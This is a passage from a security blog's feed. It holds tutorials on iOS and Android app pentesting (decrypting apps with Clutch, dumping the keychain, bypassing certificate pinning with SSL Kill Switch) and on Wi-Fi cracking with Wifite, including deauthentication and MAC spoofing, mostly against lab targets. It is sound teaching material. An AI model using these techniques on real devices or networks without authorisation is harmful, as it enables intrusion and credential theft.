&lt;div&gt;A much more serious vulnerability consists in incorrect data mapping algorithm. When a _ChatMessage_ object doesn’t have anything in the sender field, the Cubefree application crashes. So, it’s possible to loop through all the chatrooms, post an invalid _ChatMessage_ - and the application will always crash when somebody opens the chat screen. It’s fraught with bad App Store ratings, users outflow and a complete project failure.&lt;/div&gt;

&lt;div&gt;There are same vulnerabilities in other classes - but they are not within the scope of current investigation.&lt;/div&gt;

&lt;div&gt;As for security of your own applications - everything is quite transparent, just follow these simple rules:&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Always configure client permissions for all of your Parse classes.&lt;/li&gt;
  &lt;li&gt;Make use of user-based ACLs - it’s a great Parse feature.&lt;/li&gt;
  &lt;li&gt;If a client should be able to modify only one property of your class, think of encapsulating this field in the separate class. By doing it you will circumvent the possibility of illegal changes in your objects.&lt;/li&gt;
  &lt;li&gt;Don’t rely on Parse - always do a proper validity check of the data it returns you.&lt;/li&gt;
  &lt;li&gt;Remember that, theoretically, applicationID and clientKey can be found by any attacker, so you should build your application security grounding on this knowledge.&lt;/li&gt;
  &lt;li&gt;The previous advice doesn’t cancel the necessarily of obfuscating strings in code :)&lt;/li&gt;
  &lt;li&gt;Use Cloud Code in more complex situations.&lt;/li&gt;
&lt;/ul&gt;

&lt;div&gt;If you recognise some of your applications in this research, don’t blame Parse - it’s the amazing service, which minimize backend developing costs. All of the examined vulnerabilities lie heavy on the developers conscience.&lt;/div&gt;

&lt;div&gt;Further reading:&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.parse.com/docs&quot;&gt;Parse Documentation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.parse.com/2014/06/30/parse-security-i-are-you-the-key-master&quot;&gt;A small series of articles about Parse security&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/igrekde/ParseRevealer&quot;&gt;Parse Revealer&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;http://highaltitudehacks.com/2014/01/17/ios-application-security-part-28-patching-ios-application-with-hopper/&quot;&gt;iOS Application Security Part 28 - Patching iOS Application With Hopper&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.mikeash.com/pyblog/friday-qa-2012-01-06-the-hopper-disassembler.html&quot;&gt;The Hopper Disassembler by Mike Ash&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 37 - Adapting to iOS 8</title>
   <link href="https://bitbrain.github.io/2014/12/20/ios-application-security-part-37-adapting-to-ios-8.html"/>
   <updated>2014-12-20T00:27:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/12/20/ios-application-security-part-37-adapting-to-ios-8</id>
   <content type="html">&lt;p&gt;In this article we will look at all the things you need to do to set up a pentesting platform on iOS 8 and be comfortable with using all the tools.&lt;/p&gt;

&lt;h3 id=&quot;jailbreaking-your-device&quot;&gt;Jailbreaking your device&lt;/h3&gt;

&lt;p&gt;If your device is running iOS 8.1 or earlier, you can use &lt;a href=&quot;http://en.pangu.io/&quot;&gt;pangu&lt;/a&gt; to jailbreak your device. The process is pretty straightforward. We will not be covering jailbreaking your device in this article but if you want to know how it is done, you can read &lt;a href=&quot;http://www.redmondpie.com/how-to-jailbreak-ios-8.1-untethered-using-pangu8/&quot;&gt;this&lt;/a&gt; article.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;em&gt;Note: I was getting an error with Pangu saying that there was not enough space on my device even though there was enough space. I tried by putting my device into Airplane mode and by turning off Wifi on my laptop and it worked for me.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Once you jailbreak your device, you can install OpenSSH in your device using Cydia and get connectivity to your device.&lt;/p&gt;

&lt;h3 id=&quot;location-of-applications&quot;&gt;Location of applications&lt;/h3&gt;

&lt;p&gt;One of the major changes within the file structure is that the user applications are no longer located at the location &lt;em&gt;/var/mobile/Applications&lt;/em&gt;. The application bundle is stored in the location &lt;em&gt;/var/mobile/Containers/Bundle/Application&lt;/em&gt; (Appname.app) whereas the application data (Documents, Library, tmp folder) is stored in the location &lt;em&gt;/var/mobile/Containers/Data/Application&lt;/em&gt;. The name of the folder (a unique ID) will also be different for the same application. So while checking an application, it is recommended to look at both the locations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//location1.png&quot; alt=&quot;Location1&quot; /&gt; &lt;img src=&quot;/images/posts/ios37//location2.png&quot; alt=&quot;Location2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the applications that are installed by default on your device with iOS are still located in the location &lt;em&gt;/Applications/&lt;/em&gt;. For e.g, the App store application can be seen in the below image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//appstore.png&quot; alt=&quot;Appstore&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;decrypting-applications&quot;&gt;Decrypting applications&lt;/h3&gt;

&lt;p&gt;You can download the latest version of clutch to decrypt iOS 8 applications from &lt;a href=&quot;https://github.com/KJCracks/Clutch/releases&quot;&gt;here&lt;/a&gt;. You can download the binary for 1.4.7-git2 as of now. Once you download it on your device, just run it once and then run it again and it will show you the list of encrypted applications on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simply type Clutch followed by the app name to start decrypting it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//2.png&quot; alt=&quot;2&quot; /&gt; &lt;img src=&quot;/images/posts/ios37//3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;file-explorer-utilities&quot;&gt;File explorer utilities&lt;/h3&gt;

&lt;p&gt;Because of the change in the location where applications store data, iExplorer now looks inside the folder &lt;em&gt;/var/mobile/Containers/Data/Application&lt;/em&gt;. It however, doesn’t look into the application bundle. The same goes for iFunbox, which is another good file explorer utility for iOS devices. It is however recommended that you also look inside the application bundle folder also while testing an iOS application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//iexplorer.png&quot; alt=&quot;Iexplorer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cycript--class-dump-z&quot;&gt;Cycript &amp;amp; class-dump-z&lt;/h3&gt;

&lt;p&gt;Cycript and class-dump-z both work well on iOS 8 devices. However, please make sure you are using the latest version of cycript (0.9.502 at the time of writing).&lt;/p&gt;

&lt;h3 id=&quot;dumping-keychain&quot;&gt;Dumping keychain&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ptoomey3/Keychain-Dumper&quot;&gt;Keychain dumper&lt;/a&gt; works just fine and can still dump all your keychain items in your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios37//keychain.png&quot; alt=&quot;Keychain&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;swift&quot;&gt;Swift&lt;/h3&gt;

&lt;p&gt;According to Apple, Swift is a new programming language for iOS and OS X apps that builds on the best of C and Objective-C, without the constraints of C compatibility. Swift adopts safe programming patterns and adds modern features to make programming easier, more flexible, and more fun. Swift’s clean slate, backed by the mature and much-loved Cocoa and Cocoa Touch frameworks, is an opportunity to reimagine how software development works. In the future articles, we will learn how to use cycript to analyze applications written in swift. However, i recommend you to start learning swift. One of the best resources to learn it from apart from Apple’s documentation is on &lt;a href=&quot;http://www.raywenderlich.com/74438/swift-tutorial-a-quick-start&quot;&gt;Ray Wenderlich’s blog.&lt;/a&gt; Also, i would like to point out that it might take some time for this language to catch up and be actually used for developing iOS applications. We will cover swift in later articles in this series.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Damn Vulnerable iOS App v1.4 launched</title>
   <link href="https://bitbrain.github.io/2014/12/01/damn-vulnerable-ios-app-v1-dot-4-launched.html"/>
   <updated>2014-12-01T18:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/12/01/damn-vulnerable-ios-app-v1-dot-4-launched</id>
   <content type="html">&lt;p&gt;I am so excited to release the latest version of &lt;a href=&quot;http://damnvulnerableiosapp.com&quot;&gt;Damn Vulnerable iOS app for iOS 8.&lt;/a&gt; Up till now, DVIA has been downloaded more than 75000 times and i can’t wait for the count to reach 6 digits :-) Following vulnerabilities and challenges have been added in the latest version.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Sensitive information in memory&lt;/li&gt;
  &lt;li&gt;Webkit Caching (Insecure data storage)&lt;/li&gt;
  &lt;li&gt;Certificate pinning bypass&lt;/li&gt;
&lt;/ol&gt;

&lt;!-- more --&gt;

&lt;p&gt;You can download the latest version from &lt;a href=&quot;http://damnvulnerableiosapp.com/#downloads&quot;&gt;here&lt;/a&gt;. The source code is available on the project’s github page &lt;a href=&quot;https://github.com/prateek147/DVIA&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;manual-installation&quot;&gt;Manual Installation&lt;/h3&gt;

&lt;p&gt;The easiest way is to install the application from Cydia. Add the source repo.kylelevin.com and search for DamnVulnerableiOSApp. &lt;img src=&quot;/images/posts/dvia/3.png&quot; alt=&quot;3&quot; /&gt;  You can directly download the deb file also on your device and use dpkg -i DamnVulnerableiOSApp.deb to install the application followed by the command &lt;em&gt;uicache&lt;/em&gt; &lt;img src=&quot;/images/posts/dvia/4.png&quot; alt=&quot;4&quot; /&gt; Or you can download the .ipa file from the &lt;a href=&quot;http://damnvulnerableiosapp.com/#downloads&quot;&gt;downloads&lt;/a&gt; page, change its name from DamnVulnerableiOSApp.ipa to DamnVulnerableIOSApp.zip and unzip this file. This will unzip to a folder named Payload. Inside it, there will be a file named DamnVulnerableIOSApp.app. Then copy the .app file to the /Applications directory on the device using Scp. You can also use sftp or the utility iExplorer to upload this application. &lt;img src=&quot;/images/posts/dvia/1.png&quot; alt=&quot;1&quot; /&gt; Now login as the mobile user, use the command su to get root privileges and give the DVIA binary executable permissions. Then use the exit command to go back as the mobile user, and use the command uicache to install the application. If this doesn’t work, you can reboot the device or try this method again. &lt;img src=&quot;/images/posts/dvia/2.png&quot; alt=&quot;2&quot; /&gt; To compile the application, you should follow the instructions mentioned &lt;a href=&quot;http://damnvulnerableiosapp.com/2013/12/get-started/&quot;&gt;here&lt;/a&gt;. Any commits to the source code on Github or suggestions to improve the app are welcome. Special thanks to &lt;a href=&quot;http://twitter.com/crylico&quot;&gt;@crylico&lt;/a&gt; to help test the application before release and hosting the application on his repo. Happy hacking ! -Prateek&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Android Application hacking with Insecure Bank Part 1</title>
   <link href="https://bitbrain.github.io/2014/11/24/android-application-hacking-with-insecure-bank-part-1.html"/>
   <updated>2014-11-24T00:52:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/11/24/android-application-hacking-with-insecure-bank-part-1</id>
   <content type="html">&lt;p&gt;In this article series, we will learn at various concepts of Android application security while exploiting a vulnerable app InsecureBankv2. We will be looking at all the concepts from a noob’s perspective and hence i would recommend this blog series to beginners as well.&lt;/p&gt;

&lt;p&gt;However, the first thing to do is set up a proper mobile pentesting platform for android application testing.&lt;/p&gt;

&lt;p&gt;The first thing to do is download the Eclipse ADT bundle. You can then follow the instructions &lt;a href=&quot;https://developer.android.com/sdk/installing/index.html?pkg=adt&quot;&gt;here&lt;/a&gt; to install the ADT bundle. Once this is done, make sure you install the necessary sdk packages and libraries by following the instructions &lt;a href=&quot;https://developer.android.com/sdk/installing/adding-packages.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Inside the adt bundle folder and inside the sdk folder, there will be two folders, one with the name &lt;em&gt;tools&lt;/em&gt; and the other with the name &lt;em&gt;platform-tools&lt;/em&gt;. It’s important to add the location of your SDK platform tools and tools folder to the PATH environment variable. This is because you will be using most of the command line tools included in these directories and its good to have them added in the path environment variable. The command to add any path as an environment variable is &lt;em&gt;export PATH=/path/to/dir:$PATH&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Do this for both the tools and the platform-tools folder. Once this is done, you can access all the command line tools without actually browsing over to their directory. To check if this is working, type the command &lt;em&gt;adb&lt;/em&gt; and see if you are able to get an output like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To run the application on your computer, it is important to have a good emulator. Now the android virtual device manager utility in Eclipse allows you to create your own emulators. To know how to create these virtual devices, i would recommend you check &lt;a href=&quot;https://developer.android.com/tools/devices/index.html&quot;&gt;this&lt;/a&gt; article out. However, for this series, i am going to be using Genymotion to create my own emulators. There are many reasons for this. First of all, it is lightning fast and not as slow as the android emulators. Secondly, it is a rooted emulator unlike the android emulators. This means you have much more freedom of installing your own custom applications that can be used for auditing other android apps.&lt;/p&gt;

&lt;p&gt;Once you install genymotion, you should sign up for a new account (it’s free) and create different emulators based on your need. Here is what my emulators look like.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now get the latest code for the InsecureBankv2 application from &lt;a href=&quot;https://github.com/dineshshetty/Android-InsecureBankv2&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Start one of your genymotion emulators and see if you are able to get them running. Starting an emulator is as simple as clicking on the play button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inside the folder that you just cloned from github, there will be an apk file. You can install that application onto your emulator using the command &lt;em&gt;adb install InsecureBankv2.apk&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see that it successfully installed. And you can see the same on the emulator as well. But sometimes you might want to compile the application rather than run it with an apk file. To do that, open Eclipse and go to &lt;em&gt;File -&amp;gt; Switch Workspace&lt;/em&gt;, and choose the Insecure bank folder that you just created. Now go to &lt;em&gt;File -&amp;gt; Import&lt;/em&gt; and select &lt;em&gt;Existing Android code into workspace&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Select your application folder and you will see that Eclipse will import the application into your workspace. Now click on the play button on the top to run your application. Make sure your genymotion emulator is running as well. Select to run it as an android application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see that the application starts successfully on the genymotion emulator.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also start the backend python server that the android application communicates with using the command &lt;em&gt;python app.py –port 8888&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the application, go to Preferences and enter the IP address and port number of your system.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ib1/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now you can login to the application using the default credentials.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dinesh/Dinesh@123$&lt;/li&gt;
  &lt;li&gt;jack/Jack@123$&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Also make sure that you install the following utilities. We will cover them in detail as and when they are required.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.mwrinfosecurity.com/products/drozer/&quot;&gt;Drozer&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swdunlop/AndBug&quot;&gt;Andbug&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/iSECPartners/Introspy-Android&quot;&gt;Introspy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://code.google.com/p/dex2jar/&quot;&gt;dex2jar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://code.google.com/p/android-apktool/&quot;&gt;apktool&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Also, connect to your emulator using the command &lt;em&gt;adb shell&lt;/em&gt; and see what are the things you can do. I would really recommend you to have a look &lt;a href=&quot;http://developer.android.com/tools/help/adb.html&quot;&gt;here&lt;/a&gt; and try out all the commands possible with the Android debug bridge.&lt;/p&gt;

&lt;p&gt;Another thing that you can read up is what you can do with all the command line tools available in Android. You can read it from &lt;a href=&quot;http://developer.android.com/tools/projects/projects-cmdline.html&quot;&gt;here&lt;/a&gt;. In the next article, we will start at actual exploitation of the InsecureBankv2 application.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 36 – Bypassing certificate pinning using SSL Kill switch</title>
   <link href="https://bitbrain.github.io/2014/11/03/ios-application-security-part-36-bypassing-certificate-pinning-using-ssl-kill-switch.html"/>
   <updated>2014-11-03T01:00:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/11/03/ios-application-security-part-36-bypassing-certificate-pinning-using-ssl-kill-switch</id>
   <content type="html">&lt;p&gt;In this article, we will look at how we can analyze network traffic for applications that use certificate pinning. One of the best definitions i found of certificate pinning is mentioned below. It is taken directly from &lt;a href=&quot;https://www.infinum.co/the-capsized-eight/articles/securing-mobile-banking-on-android-with-ssl-certificate-pinning&quot;&gt;this&lt;/a&gt; url.&lt;/p&gt;

&lt;p&gt;By default, when making an SSL connection, the client checks that the server’s certificate:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;has a verifiable chain of trust back to a trusted (root) certificate&lt;/li&gt;
  &lt;li&gt;matches the requested hostname&lt;/li&gt;
  &lt;li&gt;What it doesn’t do is check if the certificate in question is a specific certificate, namely the one you know your server is using.&lt;/li&gt;
&lt;/ul&gt;

&lt;!-- more --&gt;

&lt;p&gt;Relying on matching certificates between the device’s trust store and the remote server opens up a security hole. The device’s trust store can easily be compromised - the user can install unsafe certificates, thus allowing potential man-in-the-middle attacks. Certificate pinning is the solution to this problem. It means hard-coding the certificate known to be used by the server in the mobile application. The app can then ignore the device’s trust store and rely on its own, and allow only SSL connections to hosts signed with certificates stored inside the application. This also gives a possibility of trusting a host with a self-signed certificate without the need to install additional certificates on the device.&lt;/p&gt;

&lt;p&gt;Certificate pinning is used by many popular applications for e.g Twitter, Square etc. So the question that arises is, how do you bypass this certificate validation that is happening on the client side ? The important thing to note here is all that all the validation is happening on the client side. And since there are frameworks like Mobile Substrate that allow us to patch any method during runtime and modify its implementation, it is possible to disable the certificate validation that is happening in the application.&lt;/p&gt;

&lt;p&gt;A POC tool for this by released in Blackhat and it was named iOS SSL Kill Switch. The full presentation can be found &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Turbo/Diquet/BH_US_12_Diqut_Osborne_Mobile_Certificate_Pinning_Slides.pdf&quot;&gt;here&lt;/a&gt;. After some time, the author realized that he was able to inspect traffic from apps that used certificate pinning (for e.g Twitter), but he wasn’t able to see the traffic going through the App Store app. He then realized he needed to patch even more low level methods and kill specific processes in order to inspect traffic going via the App store app. The full writeup for this could be found &lt;a href=&quot;https://nabla-c0d3.github.io/blog/2013/08/20/intercepting-the-app-stores-traffic-on-iOS/&quot;&gt;here&lt;/a&gt; and it’s quite interesting, so i suggest you give it a read. Also note that this tool will also be able to disable the default SSL certificate validation, so you don’t need to install a certificate as trusted root as well, which is what we usually do for inspeting traffic over HTTPs.&lt;/p&gt;

&lt;p&gt;To really check that the Twitter app uses certificate pinning, install the Twitter app and route the device traffic through Burp Proxy. Make sure you are inspect traffic via HTTP/HTTPS using the steps mentioned in &lt;a href=&quot;http://highaltitudehacks.com/2013/08/20/iOS-application-security-part-11-analyzing-network-traffic-over-http-slash-https&quot;&gt;Part 11&lt;/a&gt; of this series. However, when you open the twitter app and navigate around, the traffic is not captured by Burpsuite.&lt;/p&gt;

&lt;p&gt;To inspect the traffic going via Twitter, ssh into your device and download the iOS SSL Kill Switch package from it’s &lt;a href=&quot;https://github.com/iSECPartners/iOS-ssl-kill-switch/releases&quot;&gt;releases&lt;/a&gt; link. Also, make sure to install the following packages via Cydia.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;dpkg&lt;/li&gt;
  &lt;li&gt;MobileSubstrate&lt;/li&gt;
  &lt;li&gt;PreferenceLoader&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now install the deb package using the command &lt;em&gt;dpkg -i &lt;packagename&gt;&lt;/packagename&gt;&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios36/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, respring the device using the command &lt;em&gt;killall -HUP SpringBoard&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Once this is done, go to Settings app. There will be a new menu for SSK Kill Switch and a slider to Disable certificate validation. Make sure the slider is set to on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios36/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now route the traffic in the device to pass through Burp Proxy. Open twitter app and now you can see all the data going through via the twitter app as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios36/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To verify that SSL Kill Switch is being injected into the application, go to Xcode -&amp;gt; Devices (I am using Xcode 6), look for your device in the left menu and click on the arrow pointing up in the lower left corner to see the device logs. You will see that SSL Kill Switch is being injected into the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios36/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another cool utility that does the same job is &lt;a href=&quot;https://github.com/intrepidusgroup/trustme&quot;&gt;trustme&lt;/a&gt;. I recommend you check it out.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Wifite Walkthrough part 2: Cracking WPA access points</title>
   <link href="https://bitbrain.github.io/2014/10/27/wifite-walkthrough-part-2-cracking-wpa-access-points.html"/>
   <updated>2014-10-27T01:43:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/10/27/wifite-walkthrough-part-2-cracking-wpa-access-points</id>
   <content type="html">&lt;p&gt;In this article, we will look at cracking access points using WPA-PSK or WPA2-PSK using Wifite.&lt;/p&gt;

&lt;p&gt;If you have used tools like airodump-ng, aircrack-ng etc to crack WPA access points before, you would know that the required thing to successfully crack a WPA-PSK network is a captured WPA four-way handshake. More details about the WPA four-way handshake can be found on &lt;a href=&quot;http://en.wikipedia.org/wiki/IEEE_802.11i-2004&quot;&gt;this&lt;/a&gt; wikipedia page.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;As mentioned in the previous article, there is a bug in Wifite that may or may not be there in your particular version of Wifite. The bug basically doesn’t aireplay-ng to function properly and displays an error like &lt;em&gt;aireplay-ng exited unexpectedly&lt;/em&gt; . In order to fix this, you will have to make slight modifications in the code of wifite. You can install gedit (apt-get install gedit) which is a text editor and then edit the wifite python script (found in /usr/bin/wifite) using the steps mentioned &lt;a href=&quot;https://code.google.com/p/wifite/issues/detail?id=127&quot;&gt;here&lt;/a&gt;. To open wifite, use the command &lt;em&gt;gedit /usr/bin/wifite&lt;/em&gt;. This will open up the source code of wifite. Then replace every occurence of &lt;em&gt;cmd = [‘aireplay-ng’,&lt;/em&gt; with &lt;em&gt;cmd = [‘aireplay-ng’,’–ignore-negative-one’,&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To start wifite for cracking a WPA access point, give it the option &lt;em&gt;-wpa&lt;/em&gt; to only target WPA networks. Also, give it a dictionary file as an input for cracking the WPA passphrase with the &lt;em&gt;-dict&lt;/em&gt; option. In kali linux, the wordlists are stored at the location &lt;em&gt;/usr/share/wordlists&lt;/em&gt;. Wifite will now start scanning for WPA access points.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Press Ctrl+C to give a target number. In my case, the target number is 2 which is an access point i have configured for testing purposes. The access point uses WPA2-PSK encryption with the key as “password”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wifite will now start listening for the handshake. Once it has found it, it will automatically start cracking the passphrase using the dictionary file that we supplied.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And as you can see, Wifite has successfully found the passphrase for the access point.&lt;/p&gt;

&lt;p&gt;Sometimes, things may not work as smoothly. In order to capture a WPA handshake between the client and the access point, the client has to connect to the wireless network during that period when we are monitoring the network. If the client is already connected, there will be no handshake that is captured. Wifite does this by automatically sending deauthentication packets to a particular client or a broadcast deauthentication packet if it is required. You can specify the time between deauthentication packets using the -wpadt flag. Hence, when the client tries to reconnect to the access point, the handshake is captured.&lt;/p&gt;

&lt;p&gt;You can also specify which tool you want to use to crack the passphrase once the four-way handshake has been successfully captured. By default, aircrack-ng is selected. You can also use cowpatty, pyrit or tshark to crack the passphrase.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another cool option in Wifite is to anonymize your MAC address using the &lt;em&gt;-mac&lt;/em&gt; option. Even though it is quite trivial using simple commands or &lt;em&gt;macchanger&lt;/em&gt; utility to change the MAC address for a specific interface, it is good to have this feature in the tool itself. However, in order to make this work, you first have to take that specific interface for which you want to change the MAC address down to managed mode if it is in monitor mode previously. You can use the command &lt;em&gt;iwconfig&lt;/em&gt; to check all the interfaces that are in monitor mode and then take them down using the command &lt;em&gt;airmon-ng stop interface-name&lt;/em&gt; command. As we can see from the image below, the mon0 interface is in monitor mode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hence, lets take it down using the command &lt;em&gt;airmon-ng stop mon0&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/wifite2/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can add the &lt;em&gt;-mac&lt;/em&gt; option to anonymize the MAC address. As you can see, Wifite is intelligent enough to change the MAC address to something that is similar the existing MAC address of the interface and not to something ridiculous (for e.g AA:BB:CC:DD:EE:FF) which is a giveaway.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/wifite2/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And when you stop the capture, Wifite is nice enough to change the MAC address back to the original one.&lt;/p&gt;

&lt;p&gt;In this article, we looked at how we can use Wifite to crack networks using WPA-PSK or WPA2-PSK. Wifite is great at its job and automates almost everything, however it is important to understand how it uses the tools like airodump-ng, aircrack-ng etc under the hood to perform its task. I would recommend that you go through the source code of Wifite and figure out how this is done.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Wifite Walkthrough part 1: Cracking WEP access points</title>
   <link href="https://bitbrain.github.io/2014/10/27/wifite-walkthrough-part-1-cracking-wep-access-points.html"/>
   <updated>2014-10-27T01:41:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/10/27/wifite-walkthrough-part-1-cracking-wep-access-points</id>
   <content type="html">&lt;p&gt;In this article series, we will look at a tool named Wifite suitable for automated auditing of wireless networks. Most of you who have experience in wireless pentesting would use tools like airmon-ng, aireplay-ng, airodump-ng, aircrack-ng to crack wireless networks. This would involve a sequence of steps, like capturing a specific numbers of IV’s in case of WEP, capturing the WPA handshake in case of WPA etc, and then subsequently using aircrack-ng to crack the password required for authentication to the network. Wifite aims to ease this process by using a wrapper over all these tools and thus making it super easy to crack Wifi networks.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Here is a list of features of Wifite as per its official &lt;a href=&quot;https://code.google.com/p/wifite/&quot;&gt;homepage&lt;/a&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;sorts targets by signal strength (in dB); cracks closest access points first&lt;/li&gt;
  &lt;li&gt;automatically de-authenticates clients of hidden networks to reveal SSIDs&lt;/li&gt;
  &lt;li&gt;numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)&lt;/li&gt;
  &lt;li&gt;customizable settings (timeouts, packets/sec, etc)&lt;/li&gt;
  &lt;li&gt;“anonymous” feature; changes MAC to a random address before attacking, then changes back when attacks are complete&lt;/li&gt;
  &lt;li&gt;all captured WPA handshakes are backed up to wifite.py’s current directory&lt;/li&gt;
  &lt;li&gt;smart WPA de-authentication; cycles between all clients and broadcast deauths&lt;/li&gt;
